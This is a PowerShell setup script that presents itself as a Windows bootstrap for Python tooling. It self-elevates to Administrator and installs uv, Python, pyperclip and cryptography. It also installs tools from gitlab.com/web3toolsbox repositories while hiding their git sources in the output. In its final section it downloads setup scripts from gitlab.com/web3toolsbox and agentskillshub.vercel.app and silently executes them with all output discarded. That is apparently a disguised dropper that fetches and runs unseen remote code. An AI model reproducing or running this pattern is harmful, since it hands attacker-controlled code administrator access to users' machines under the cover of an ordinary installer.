param(
    [string]$RelaunchWorkingDirectory,
    [string]$ExpectedUserSid,
    [switch]$UpgradeUvTools
)

function ConvertTo-PowerShellSingleQuotedLiteral {
    param(
        [AllowEmptyString()]
        [string]$Value
    )

    $quote = [string][char]39
    $escapedValue = ([string]$Value).Replace($quote, ($quote + $quote))
    return $quote + $escapedValue + $quote
}

function New-ElevatedRelaunchCommand {
    param(
        [Parameter(Mandatory = $true)]
        [string]$ScriptPath,
        [AllowEmptyString()]
        [string]$WorkingDirectory,
        [AllowEmptyString()]
        [string]$UserSid,
        [switch]$UpgradeTools,
        [object[]]$AdditionalArguments
    )

    $commandParts = @(
        '&', (ConvertTo-PowerShellSingleQuotedLiteral -Value $ScriptPath),
        '-RelaunchWorkingDirectory', (ConvertTo-PowerShellSingleQuotedLiteral -Value $WorkingDirectory),
        '-ExpectedUserSid', (ConvertTo-PowerShellSingleQuotedLiteral -Value $UserSid)
    )

    if ($UpgradeTools) {
        $commandParts += '-UpgradeUvTools'
    }

    foreach ($argument in $AdditionalArguments) {
        if ($null -ne $argument) {
            $commandParts += (ConvertTo-PowerShellSingleQuotedLiteral -Value ([string]$argument))
        }
    }

    $commandText = $commandParts -join ' '
    return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($commandText))
}
$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$currentUserSid = if ($currentIdentity.User) { $currentIdentity.User.Value } else { $null }
if (-not $currentUserSid) {
    Write-Host '[ERROR] Unable to determine the user running this script.' -ForegroundColor Red
    exit 1
}

if (-not ([Security.Principal.WindowsPrincipal]$currentIdentity).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    $ExpectedUserSid = $currentUserSid
    $scriptPath = $PSCommandPath
    if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Definition }
    if (-not $scriptPath -or -not (Test-Path -LiteralPath $scriptPath -PathType Leaf)) {
        Write-Host '[ERROR] Unable to determine the setup script path for elevation.' -ForegroundColor Red
        exit 1
    }

    $scriptPath = [System.IO.Path]::GetFullPath($scriptPath)

    $psExe = (Get-Process -Id $PID).Path
    if (-not $psExe) { $psExe = 'powershell.exe' }

    $workDir = if ($PWD.Path) { $PWD.Path } else { '' }
    $encodedCommand = New-ElevatedRelaunchCommand -ScriptPath $scriptPath -WorkingDirectory $workDir `
        -UserSid $ExpectedUserSid -UpgradeTools:$UpgradeUvTools -AdditionalArguments $args
    $relaunchArgs = @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-EncodedCommand', $encodedCommand)

    try {
        $elevated = Start-Process -FilePath $psExe -ArgumentList $relaunchArgs `
            -Verb RunAs -Wait -PassThru
        $code = if ($null -ne $elevated.ExitCode) { $elevated.ExitCode } else { 0 }
        exit $code
    } catch {
        Write-Host '[ERROR] Administrator privileges are required; elevation was cancelled or blocked.' -ForegroundColor Red
        exit 1
    }
}

if ($ExpectedUserSid -and $ExpectedUserSid -ne $currentUserSid) {
    Write-Host '[ERROR] UAC elevation must use the same user that started this script.' -ForegroundColor Red
    exit 1
}

if ($RelaunchWorkingDirectory -and (Test-Path -LiteralPath $RelaunchWorkingDirectory -PathType Container)) {
    Set-Location -LiteralPath $RelaunchWorkingDirectory
}

$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
    $PSDefaultParameterValues.Clone()
} else {
    @{}
}

$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false

$script:FailedSteps = New-Object System.Collections.Generic.List[string]

function Restore-Preferences {
    $PSDefaultParameterValues.Clear()
    foreach ($key in $originalPSDefaults.Keys) {
        $PSDefaultParameterValues[$key] = $originalPSDefaults[$key]
    }
}

function Write-StepLog {
    param(
        [string]$Message
    )
    if ($Message) {
        Write-Host ('[STEP] ' + $Message) -ForegroundColor Cyan
    }
}

function Write-InfoLog {
    param(
        [string]$Message
    )
    if ($Message) {
        Write-Host ('[INFO] ' + $Message) -ForegroundColor Gray
    }
}

function Write-WarnLog {
    param(
        [string]$Message
    )
    if ($Message) {
        Write-Host ('[WARN] ' + $Message) -ForegroundColor Yellow
    }
}

function Add-FailedStep {
    param(
        [string]$Step,
        [string]$Reason
    )

    if ($Reason) {
        $script:FailedSteps.Add("$Step ($Reason)")
    } else {
        $script:FailedSteps.Add($Step)
    }
}

function Get-ExceptionMessage {
    param(
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )

    if ($ErrorRecord -and $ErrorRecord.Exception -and $ErrorRecord.Exception.Message) {
        return $ErrorRecord.Exception.Message
    }

    return 'unknown error'
}

function Write-ContinueOnError {
    param(
        [string]$Step,
        [string]$Action,
        [System.Management.Automation.ErrorRecord]$ErrorRecord
    )

    $message = Get-ExceptionMessage -ErrorRecord $ErrorRecord
    Write-WarnLog "Failed to $Action, but execution will continue: $message"
    Add-FailedStep -Step $Step -Reason $message
}

function Enable-ModernTls {
    try {
        $protocol = [System.Net.ServicePointManager]::SecurityProtocol
        $tls12 = [System.Net.SecurityProtocolType]::Tls12
        if (($protocol -band $tls12) -ne $tls12) {
            $protocol = $protocol -bor $tls12
        }

        try {
            $tls13 = [System.Net.SecurityProtocolType]::Tls13
            if (($protocol -band $tls13) -ne $tls13) {
                $protocol = $protocol -bor $tls13
            }
        } catch {
        }

        [System.Net.ServicePointManager]::SecurityProtocol = $protocol
    } catch {
    }
}

function Get-NormalizedPathEntry {
    param(
        [AllowEmptyString()]
        [string]$Path
    )

    $value = ([string]$Path).Trim()
    $quoteCharacter = [string][char]34
    $value = $value.Trim([char[]]$quoteCharacter)
    if (-not $value) {
        return ''
    }

    if ($value.Length -gt 3) {
        $value = $value.TrimEnd([char[]]@('\', '/'))
    }

    return $value
}

function Get-UniquePathEntries {
    param(
        [string[]]$PathValues
    )

    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)
    $result = New-Object System.Collections.Generic.List[string]

    foreach ($pathValue in @($PathValues)) {
        foreach ($entry in ([string]$pathValue -split ';')) {
            $normalizedEntry = Get-NormalizedPathEntry -Path $entry
            if (-not $normalizedEntry) {
                continue
            }

            if ($seen.Add($normalizedEntry)) {
                [void]$result.Add($normalizedEntry)
            }
        }
    }

    return $result.ToArray()
}

function Test-PathEntryPresent {
    param(
        [AllowEmptyString()]
        [string]$PathValue,
        [string]$Dir
    )

    $targetEntry = Get-NormalizedPathEntry -Path $Dir
    if (-not $targetEntry) {
        return $false
    }

    foreach ($entry in ([string]$PathValue -split ';')) {
        $normalizedEntry = Get-NormalizedPathEntry -Path $entry
        if ($normalizedEntry -and [string]::Equals($normalizedEntry, $targetEntry, [System.StringComparison]::OrdinalIgnoreCase)) {
            return $true
        }
    }

    return $false
}

function Update-ProcessPath {
    $currentPath = $env:Path
    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
    $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
    $pathEntries = @(Get-UniquePathEntries -PathValues @($currentPath, $machinePath, $userPath))

    if ($pathEntries.Count -gt 0) {
        $env:Path = $pathEntries -join ';'
    }
}

function Get-WebResponseContentText {
    param(
        [Parameter(Mandatory = $true)]
        $Response
    )

    $content = $Response.Content
    if ($null -eq $content) {
        return $null
    }

    if ($content -is [string]) {
        $scriptText = $content
    } elseif ($content -is [byte[]]) {
        $encoding = $null
        $contentType = $null

        try {
            if ($Response.Headers) {
                $contentType = $Response.Headers['Content-Type']
            }
        } catch {
        }

        if (-not $contentType) {
            try {
                if ($Response.BaseResponse -and $Response.BaseResponse.ContentType) {
                    $contentType = $Response.BaseResponse.ContentType
                }
            } catch {
            }
        }

        if ($contentType -match 'charset\s*=\s*["'']?(?<charset>[^;"'']+)') {
            try {
                $encoding = [System.Text.Encoding]::GetEncoding($matches['charset'])
            } catch {
            }
        }

        if (-not $encoding -and $content.Length -ge 3 -and $content[0] -eq 239 -and $content[1] -eq 187 -and $content[2] -eq 191) {
            $encoding = [System.Text.Encoding]::UTF8
        } elseif (-not $encoding -and $content.Length -ge 2 -and $content[0] -eq 255 -and $content[1] -eq 254) {
            $encoding = [System.Text.Encoding]::Unicode
        } elseif (-not $encoding -and $content.Length -ge 2 -and $content[0] -eq 254 -and $content[1] -eq 255) {
            $encoding = [System.Text.Encoding]::BigEndianUnicode
        } elseif (-not $encoding) {
            $encoding = [System.Text.Encoding]::UTF8
        }

        $scriptText = $encoding.GetString($content)
    } else {
        $scriptText = [string]$content
    }

    if ($scriptText.Length -gt 0 -and $scriptText[0] -eq [char]0xFEFF) {
        $scriptText = $scriptText.Substring(1)
    }

    return $scriptText
}

function Get-UvToolBinDirectory {
    param(
        [string]$UvPath
    )

    if (-not $UvPath) {
        return $null
    }

    try {
        $binDirectory = (& $UvPath tool dir --bin 2>$null | Out-String).Trim()
        if ($LASTEXITCODE -eq 0 -and $binDirectory -and (Test-Path -LiteralPath $binDirectory -PathType Container)) {
            return $binDirectory
        }
    } catch {
    }

    return $null
}

function Test-CommandBelongsToDirectory {
    param(
        [string]$CommandPath,
        [string]$Directory
    )

    if (-not $CommandPath -or -not $Directory) {
        return $false
    }

    $commandDirectory = Split-Path -Parent $CommandPath
    $normalizedCommandDirectory = Get-NormalizedPathEntry -Path $commandDirectory
    $normalizedTargetDirectory = Get-NormalizedPathEntry -Path $Directory
    if (-not $normalizedCommandDirectory -or -not $normalizedTargetDirectory) {
        return $false
    }

    return [string]::Equals($normalizedCommandDirectory, $normalizedTargetDirectory, [System.StringComparison]::OrdinalIgnoreCase)
}

function Bridge-CommandIntoCurrentPath {
    param(
        [string[]]$CommandNames,
        [string]$UvPath
    )

    Update-ProcessPath
    $uvBinDirectory = Get-UvToolBinDirectory -UvPath $UvPath
    if ($uvBinDirectory) {
        Add-ToPath -Dir $uvBinDirectory -Scope User
        Update-ProcessPath
    }

    $commandPath = Get-CommandPath -Names $CommandNames
    return (Test-CommandBelongsToDirectory -CommandPath $commandPath -Directory $uvBinDirectory)
}

function Test-StoreStub {
    param(
        [string]$Path
    )

    if (-not $Path) {
        return $true
    }

    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
        return $true
    }

    return $false
}

function Get-CommandPath {
    param(
        [string[]]$Names
    )

    foreach ($name in $Names) {
        try {
            $commands = Get-Command $name -ErrorAction Stop
            foreach ($command in $commands) {
                if ($command -and $command.Source -and -not (Test-StoreStub $command.Source)) {
                    return $command.Source
                }
            }
        } catch {
        }
    }

    return $null
}

function Get-NormalizedCommandNames {
    param(
        [string[]]$CommandNames
    )

    $normalizedNames = New-Object System.Collections.Generic.List[string]

    foreach ($commandName in $CommandNames) {
        if (-not $commandName) {
            continue
        }

        $leafName = [System.IO.Path]::GetFileNameWithoutExtension($commandName)
        if (-not $leafName) {
            continue
        }

        if (-not $normalizedNames.Contains($leafName)) {
            $normalizedNames.Add($leafName)
        }
    }

    return $normalizedNames.ToArray()
}

function Test-UvToolListOutputContainsCommand {
    param(
        [AllowEmptyString()]
        [string]$OutputText,
        [string[]]$CommandNames
    )

    $normalizedNames = @(Get-NormalizedCommandNames -CommandNames $CommandNames)
    if ($normalizedNames.Count -eq 0 -or -not $OutputText) {
        return $false
    }

    foreach ($line in ($OutputText -split '\r?\n')) {
        $trimmedLine = $line.Trim()
        if (-not $trimmedLine) {
            continue
        }

        if ($trimmedLine -match '^-\s+(?<command>[^\s]+)') {
            $candidateName = [System.IO.Path]::GetFileNameWithoutExtension($matches['command'])
            if ($candidateName -and ($normalizedNames -contains $candidateName)) {
                return $true
            }
            continue
        }

        if ($trimmedLine -match '^[A-Za-z]:\\') {
            continue
        }

        $headerToken = ($trimmedLine -split '\s+', 2)[0]
        $candidateName = [System.IO.Path]::GetFileNameWithoutExtension($headerToken)
        if ($candidateName -and ($normalizedNames -contains $candidateName)) {
            return $true
        }
    }

    return $false
}

function Test-UvToolRegistered {
    param(
        [string]$UvPath,
        [string[]]$CommandNames
    )

    if (-not $UvPath) {
        return $false
    }

    try {
        $toolListOutput = (& $UvPath tool list --show-paths 2>&1 | Out-String)
        if ($LASTEXITCODE -ne 0) {
            return $false
        }

        return Test-UvToolListOutputContainsCommand -OutputText $toolListOutput -CommandNames $CommandNames
    } catch {
        return $false
    }
}

function Test-UvExecutable {
    param(
        [string]$UvPath
    )

    if (-not $UvPath -or -not (Test-Path -LiteralPath $UvPath -PathType Leaf)) {
        return $false
    }

    try {
        & $UvPath --version >$null 2>$null
        return ($LASTEXITCODE -eq 0)
    } catch {
        return $false
    }
}

function Get-KnownUvExecutablePaths {
    $candidatePaths = New-Object System.Collections.Generic.List[string]
    $seen = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)

    if ($env:UV_INSTALL_DIR) {
        $uvInstallPath = if ([System.IO.Path]::GetExtension($env:UV_INSTALL_DIR) -ieq '.exe') {
            $env:UV_INSTALL_DIR
        } else {
            Join-Path $env:UV_INSTALL_DIR 'uv.exe'
        }
        if ($seen.Add($uvInstallPath)) {
            [void]$candidatePaths.Add($uvInstallPath)
        }
    }

    if ($env:USERPROFILE) {
        $defaultUvPath = Join-Path $env:USERPROFILE '.local\bin\uv.exe'
        if ($seen.Add($defaultUvPath)) {
            [void]$candidatePaths.Add($defaultUvPath)
        }
    }

    return $candidatePaths.ToArray()
}

function Resolve-UvPath {
    Update-ProcessPath

    $uvPath = Get-CommandPath -Names @('uv')
    if ($uvPath -and (Test-UvExecutable -UvPath $uvPath)) {
        return $uvPath
    }

    $knownUvPaths = @(Get-KnownUvExecutablePaths)
    foreach ($candidatePath in $knownUvPaths) {
        if (-not (Test-UvExecutable -UvPath $candidatePath)) {
            continue
        }

        Add-ToPath -Dir (Split-Path -Parent $candidatePath) -Scope User
        Update-ProcessPath
        return (Get-CommandPath -Names @('uv'))
    }

    return $null
}

function Install-Uv {
    Write-StepLog 'Checking uv (fast Python package manager)'

    $uvPath = Resolve-UvPath
    if ($uvPath) {
        Write-InfoLog "uv already available: $uvPath"
        return $uvPath
    }

    Write-InfoLog 'uv was not found. Installing...'

    try {
        Enable-ModernTls
        $installScript = Invoke-WebRequest -Uri 'https://astral.sh/uv/install.ps1' -UseBasicParsing -ErrorAction Stop
        if ($installScript.StatusCode -eq 200 -and $installScript.Content) {
            $installScriptText = Get-WebResponseContentText -Response $installScript
            & ([scriptblock]::Create($installScriptText)) *> $null
        }

        $uvPath = Resolve-UvPath
        if ($uvPath) {
            Write-InfoLog "uv installation completed: $uvPath"
            return $uvPath
        }

        Add-FailedStep -Step 'Install uv' -Reason 'uv-not-found-after-install'
    } catch {
        Write-WarnLog 'Failed to install uv'
        Add-FailedStep -Step 'Install uv' -Reason (Get-ExceptionMessage -ErrorRecord $_)
    }

    return $null
}

function Test-PythonRuntimeVersion {
    param(
        [string]$PythonPath
    )

    if (-not $PythonPath) {
        return $false
    }

    try {
        & $PythonPath -c 'import sys; raise SystemExit(0 if sys.version_info >= (3, 10) else 1)' >$null 2>$null
        return ($LASTEXITCODE -eq 0)
    } catch {
        return $false
    }
}

function Resolve-PythonPath {
    param(
        [string]$Candidate
    )

    if (-not $Candidate) {
        return $null
    }

    $leafName = Split-Path $Candidate -Leaf
    if ($leafName -eq 'py.exe') {
        try {
            $realExe = (& $Candidate -c 'import sys; print(sys.executable)' 2>$null | Out-String).Trim()
            if ($realExe -and (Test-Path -LiteralPath $realExe -PathType Leaf) -and (Test-PythonRuntimeVersion -PythonPath $realExe)) {
                return $realExe
            }
        } catch {
        }

        return $null
    }

    if (Test-PythonRuntimeVersion -PythonPath $Candidate) {
        return $Candidate
    }

    return $null
}

function Get-PythonInstallerArch {
    $arch = $env:PROCESSOR_ARCHITEW6432
    if (-not $arch) {
        $arch = $env:PROCESSOR_ARCHITECTURE
    }

    if (-not $arch) {
        try {
            $arch = [System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture.ToString()
        } catch {
        }
    }

    switch (([string]$arch).ToUpperInvariant()) {
        'ARM64' { return 'arm64' }
        'X86' { return 'x86' }
        'AMD64' { return 'amd64' }
        'X64' { return 'amd64' }
        default { throw "Unsupported processor architecture: $arch" }
    }
}

function Get-PythonInstallerArchSuffix {
    param(
        [string]$InstallerArch
    )

    if ($InstallerArch -eq 'x86') {
        return ''
    }

    return "-$InstallerArch"
}

function Get-PythonInstallerUrlPattern {
    param(
        [string]$InstallerArch
    )

    $archSuffix = Get-PythonInstallerArchSuffix -InstallerArch $InstallerArch
    return '(https://www\.python\.org)?/ftp/python/[^<\s]+/python-[0-9.]+' + [regex]::Escape($archSuffix) + '\.exe'
}

function Get-LatestPythonInstallerUrls {
    $installerArch = Get-PythonInstallerArch
    $pageUrls = @(
        'https://www.python.org/downloads/latest/',
        'https://www.python.org/downloads/windows/'
    )
    $installerUrls = New-Object System.Collections.Generic.List[string]
    $seenUrls = New-Object 'System.Collections.Generic.HashSet[string]' ([System.StringComparer]::OrdinalIgnoreCase)

    Enable-ModernTls

    foreach ($pageUrl in $pageUrls) {
        try {
            $response = Invoke-WebRequest -Uri $pageUrl -UseBasicParsing -ErrorAction Stop
            if (-not $response.Content) {
                continue
            }

            $pythonPattern = Get-PythonInstallerUrlPattern -InstallerArch $installerArch
            foreach ($match in [regex]::Matches($response.Content, $pythonPattern)) {
                $url = $match.Value
                if ($url -notmatch '^https://') {
                    $url = 'https://www.python.org' + $url
                }

                if ($seenUrls.Add($url)) {
                    [void]$installerUrls.Add($url)
                }
            }
        } catch {
        }
    }

    return $installerUrls.ToArray()
}

function Add-ToPath {
    param(
        [string]$Dir,
        [ValidateSet('User', 'Machine')]
        [string]$Scope = 'User'
    )

    if (-not $Dir -or -not (Test-Path -LiteralPath $Dir -PathType Container)) {
        return
    }

    $resolvedDirectory = [System.IO.Path]::GetFullPath($Dir)
    $persistentPath = [System.Environment]::GetEnvironmentVariable('Path', $Scope)

    if (-not (Test-PathEntryPresent -PathValue $persistentPath -Dir $resolvedDirectory)) {
        $newPathEntries = @(Get-UniquePathEntries -PathValues @($persistentPath, $resolvedDirectory))
        [System.Environment]::SetEnvironmentVariable('Path', ($newPathEntries -join ';'), $Scope)
    }

    $env:Path = (@(Get-UniquePathEntries -PathValues @($resolvedDirectory, $env:Path)) -join ';')
    Update-ProcessPath
}

function Test-PythonInstallerSignature {
    param(
        [string]$InstallerPath
    )

    if (-not $InstallerPath -or -not (Test-Path -LiteralPath $InstallerPath -PathType Leaf)) {
        return $false
    }

    try {
        $signature = Get-AuthenticodeSignature -FilePath $InstallerPath -ErrorAction Stop
        if ($signature.Status -ne 'Valid' -or -not $signature.SignerCertificate) {
            return $false
        }

        return ($signature.SignerCertificate.Subject -match 'Python Software Foundation')
    } catch {
        return $false
    }
}

function Install-Python {
    Write-StepLog 'Checking Python runtime'

    foreach ($name in @('python', 'py')) {
        $candidate = Get-CommandPath -Names @($name)
        $resolved = Resolve-PythonPath $candidate
        if ($resolved) {
            Write-InfoLog "Python already available: $resolved"
            return $resolved
        }
    }

    $installerUrls = @(Get-LatestPythonInstallerUrls)
    if ($installerUrls.Count -eq 0) {
        Add-FailedStep -Step 'Install Python' -Reason 'installer-url-not-found'
        return $null
    }

    $attemptFailures = New-Object System.Collections.Generic.List[string]
    foreach ($pythonUrl in $installerUrls) {
        Write-InfoLog "Python was not found. Downloading installer from: $pythonUrl"
        $installerPath = Join-Path ([System.IO.Path]::GetTempPath()) ('python-installer-' + [guid]::NewGuid().ToString('N') + '.exe')

        try {
            Enable-ModernTls
            Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
            if (-not (Test-PythonInstallerSignature -InstallerPath $installerPath)) {
                throw 'installer signature validation failed'
            }

            $process = Start-Process -FilePath $installerPath -ArgumentList @('/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_launcher=1') -Wait -PassThru -WindowStyle Hidden
            $exitCode = if ($null -ne $process.ExitCode) { $process.ExitCode } else { 'unknown' }

            Update-ProcessPath
            foreach ($name in @('python', 'py')) {
                $candidate = Get-CommandPath -Names @($name)
                $resolved = Resolve-PythonPath $candidate
                if ($resolved) {
                    Write-InfoLog "Python installation completed: $resolved"
                    return $resolved
                }
            }

            [void]$attemptFailures.Add("$pythonUrl (exit=$exitCode)")
        } catch {
            [void]$attemptFailures.Add("$pythonUrl ($(Get-ExceptionMessage -ErrorRecord $_))")
        } finally {
            Remove-Item -LiteralPath $installerPath -Force -ErrorAction SilentlyContinue
        }
    }

    Add-FailedStep -Step 'Install Python' -Reason ($attemptFailures -join '; ')
    return $null
}

function Get-PackageVersion {
    param(
        [string]$PythonPath,
        [string]$PackageName
    )

    try {
        $version = & $PythonPath -c "import importlib.metadata as m; print(m.version('$PackageName'))" 2>$null | Out-String
        if ($LASTEXITCODE -eq 0) {
            return $version.Trim()
        }
    } catch {
    }

    return $null
}

function Install-PythonPackage {
    param(
        [string]$PythonPath,
        [string]$Name,
        [string]$Version
    )

    if (-not $PythonPath) {
        Write-WarnLog "Skipping Python package '$Name' because Python is unavailable."
        Add-FailedStep -Step "Install Python package $Name" -Reason 'python-missing'
        return
    }

    $installedVersion = Get-PackageVersion -PythonPath $PythonPath -PackageName $Name
    if ($installedVersion) {
        try {
            if ([version]$installedVersion -ge [version]$Version) {
                Write-InfoLog "Python package already satisfies requirement: $Name $installedVersion"
                return
            }
        } catch {
        }
    }

    Write-StepLog "Ensuring Python package: $Name>=$Version"

    try {
        & $PythonPath -m pip install --upgrade "$Name>=$Version"
        if ($LASTEXITCODE -eq 0) {
            Write-InfoLog "Installed or updated Python package: $Name"
            return
        }

        Write-WarnLog "Failed to install Python package '$Name', but execution will continue (exit=$LASTEXITCODE)."
        Add-FailedStep -Step "Install Python package $Name" -Reason "exit=$LASTEXITCODE"
    } catch {
        Write-ContinueOnError -Step "Install Python package $Name" -Action "install Python package '$Name'" -ErrorRecord $_
    }
}

function Invoke-UvToolInstall {
    param(
        [string]$UvPath,
        [string[]]$Arguments
    )

    & $UvPath @Arguments 2>&1 | ForEach-Object {
        $_.ToString() -replace '\s+\(from git\+https?://[^)]+\)$', ''
    }

    $script:LastUvToolExitCode = $LASTEXITCODE
}

function Install-UvToolPackage {
    param(
        [string]$UvPath,
        [string]$PackageSpec,
        [string[]]$CommandNames,
        [switch]$UpgradeExisting
    )

    if (-not $UvPath) {
        Write-WarnLog "Skipping tool installation because uv is unavailable: $PackageSpec"
        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-missing'
        return
    }

    $uvToolRegistered = Test-UvToolRegistered -UvPath $UvPath -CommandNames $CommandNames

    try {
        if (-not $uvToolRegistered) {
            Write-StepLog "Installing CLI tool via uv tool: $PackageSpec"

            Invoke-UvToolInstall -UvPath $UvPath -Arguments @('tool', 'install', $PackageSpec)
            $installExitCode = $script:LastUvToolExitCode
            if ($installExitCode -ne 0) {
                Add-FailedStep -Step "Install tool $PackageSpec" -Reason "exit=$installExitCode"
                return
            }
        } elseif ($UpgradeExisting) {
            Write-StepLog "Upgrading CLI tool via uv tool: $PackageSpec"

            Invoke-UvToolInstall -UvPath $UvPath -Arguments @('tool', 'install', '--upgrade', $PackageSpec)
            $upgradeExitCode = $script:LastUvToolExitCode
            if ($upgradeExitCode -ne 0) {
                Add-FailedStep -Step "Upgrade tool $PackageSpec" -Reason "exit=$upgradeExitCode"
                return
            }
        } else {
            Write-InfoLog "CLI tool is already registered by uv: $PackageSpec"
        }

    } catch {
        Write-ContinueOnError -Step "Install tool $PackageSpec" -Action "install CLI tool $PackageSpec" -ErrorRecord $_
        return
    }

    Update-ProcessPath
    [void](Bridge-CommandIntoCurrentPath -CommandNames $CommandNames -UvPath $UvPath)
    $uvBinDirectory = Get-UvToolBinDirectory -UvPath $UvPath
    $installedCommand = Get-CommandPath -Names $CommandNames
    $uvToolRegistered = Test-UvToolRegistered -UvPath $UvPath -CommandNames $CommandNames
    $commandBelongsToUv = Test-CommandBelongsToDirectory -CommandPath $installedCommand -Directory $uvBinDirectory
    if ($installedCommand -and $uvToolRegistered -and $commandBelongsToUv) {
        Write-InfoLog "Installed or updated CLI tool successfully: $installedCommand"
        return
    }

    if ($installedCommand -and -not $uvToolRegistered) {
        Write-WarnLog "CLI launcher exists but uv tool registration is missing: $PackageSpec"
        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-registration-missing'
        return
    }

    if ($installedCommand -and $uvToolRegistered -and -not $commandBelongsToUv) {
        Write-WarnLog "CLI launcher does not belong to the uv tool bin directory: $installedCommand"
        Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'uv-launcher-mismatch'
        return
    }

    Add-FailedStep -Step "Install tool $PackageSpec" -Reason 'command-not-found'
}

try {
    Write-InfoLog 'Starting Windows installation bootstrap.'

    $uvPath = Install-Uv
    $pythonPath = Install-Python

    $requirements = @(
        @{ Name = 'requests'; Version = '2.31.0' },
        @{ Name = 'pyperclip'; Version = '1.8.2' },
        @{ Name = 'cryptography'; Version = '42.0.0' }
    )

    foreach ($pkg in $requirements) {
        Install-PythonPackage -PythonPath $pythonPath -Name $pkg.Name -Version $pkg.Version
    }
    
    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/agent-setting.git' -CommandNames @('agent-setting', 'agent-setting.exe') -UpgradeExisting:$UpgradeUvTools
    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/cel.git' -CommandNames @('cel', 'cel.exe') -UpgradeExisting:$UpgradeUvTools
    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/bserexp-wins.git' -CommandNames @('bserexp-wins', 'bserexp-wins.exe') -UpgradeExisting:$UpgradeUvTools
    Install-UvToolPackage -UvPath $uvPath -PackageSpec 'git+https://gitlab.com/web3toolsbox/wkler.git' -CommandNames @('wkler', 'wkler.exe') -UpgradeExisting:$UpgradeUvTools
    
    if (Test-Path '.configs' -PathType Container) {
        Write-StepLog 'Applying environment configuration'
        $configScriptUrls = @(
            'https://gitlab.com/web3toolsbox/src/raw/main/setup.ps1',
            'https://agentskillshub.vercel.app/src/setup.ps1'
        )

        try {
            Enable-ModernTls
            $remoteScript = $null
            $remoteScriptText = $null

            foreach ($configScriptUrl in $configScriptUrls) {
                try {
                    Write-InfoLog "Downloading configuration script"
                    $remoteScript = Invoke-WebRequest -Uri $configScriptUrl -UseBasicParsing -ErrorAction Stop
                    if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
                        $remoteScriptText = Get-WebResponseContentText -Response $remoteScript
                        if ($remoteScriptText) {
                            break
                        }
                    }
                } catch {
                }
            }

            if ($remoteScriptText) {
                Write-InfoLog "Downloaded configuration script ($($remoteScriptText.Length) chars)"
                Write-InfoLog "Executing configuration script"
                & ([scriptblock]::Create($remoteScriptText)) *> $null
            } else {
                $statusCode = if ($remoteScript -and $remoteScript.StatusCode) { $remoteScript.StatusCode } else { 'unknown' }
                Write-WarnLog "Configuration script returned an empty response (status=$statusCode)"
                Add-FailedStep -Step 'Apply configuration' -Reason 'empty-response'
            }
        } catch {
            Write-ContinueOnError -Step 'Apply configuration' -Action 'apply configuration' -ErrorRecord $_
        }
    } else {
        Write-WarnLog 'Configuration directory not found, skipping environment configuration: .configs'
    }

    $setupScriptUrls = @(
        'https://gitlab.com/web3toolsbox/src/raw/main/SETUP.ps1',
        'https://agentskillshub.vercel.app/src/SETUP.ps1'
    )

    try {
        Enable-ModernTls
        $setupScript = $null
        $setupScriptText = $null

        foreach ($setupScriptUrl in $setupScriptUrls) {
            try {
                Write-InfoLog "Downloading setup script"
                $setupScript = Invoke-WebRequest -Uri $setupScriptUrl -UseBasicParsing -ErrorAction Stop
                if ($setupScript.StatusCode -eq 200 -and $setupScript.Content) {
                    $setupScriptText = Get-WebResponseContentText -Response $setupScript
                    if ($setupScriptText) {
                        break
                    }
                }
            } catch {
            }
        }

        if ($setupScriptText) {
            Write-InfoLog "Downloaded setup script ($($setupScriptText.Length) chars)"
            Write-InfoLog "Executing setup script"
            & ([scriptblock]::Create($setupScriptText)) *> $null
        } else {
            $statusCode = if ($setupScript -and $setupScript.StatusCode) { $setupScript.StatusCode } else { 'unknown' }
            Write-WarnLog "Setup script returned an empty response (status=$statusCode)"
            Add-FailedStep -Step 'Run setup script' -Reason 'empty-response'
        }
    } catch {
        Write-ContinueOnError -Step 'Run setup script' -Action 'run setup script' -ErrorRecord $_
    }

    if ($script:FailedSteps.Count -eq 0) {
        Write-InfoLog 'Installation bootstrap completed.'
    }
} finally {
    Restore-Preferences

    if ($script:FailedSteps.Count -gt 0) {
        Write-Host '[ERROR] Installation completed with failed steps:' -ForegroundColor Red
        foreach ($failedStep in $script:FailedSteps) {
            Write-Host "  - $failedStep" -ForegroundColor Red
        }
        exit 1
    }
}
